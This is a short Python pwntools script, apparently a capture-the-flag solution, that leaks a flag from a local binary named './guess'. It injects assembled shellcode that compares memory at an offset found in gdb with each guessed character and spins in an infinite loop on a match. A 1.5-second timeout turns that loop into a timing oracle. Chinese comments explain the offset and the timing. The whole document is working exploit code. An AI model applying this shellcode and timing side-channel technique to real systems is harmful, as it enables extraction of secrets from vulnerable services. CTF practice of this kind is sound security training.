#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import string , time

context.arch = 'amd64'

pool = string.ascii_lowercase + string.digits + '{}_ !:?' + string.ascii_uppercase
flag = ''

for i in range(0x100):
    success = False
    for c in pool:
        r = process('./guess')
        sc = asm('''
            add r12, %s
            cmp byte ptr [r12], %s
        	loop: #無限迴圈, 猜中的話會等 1.5s (timeout=1.5) 
            	je loop
        	''' % (hex(0x200900+i) , ord(c))) # 由 gdb 發現 r12 與 flag 放置區差異為 0x200900
        
        r.sendafter(':', sc)
        start = time.time()
        r.recvall(timeout=1.5)

        if time.time() - start > 1: # 猜中時間差約為 1.5s 猜錯立即結束
            flag += c
            success = True
            print flag
            break
    if not success:
    	break
    	
print flag
r.interactive()


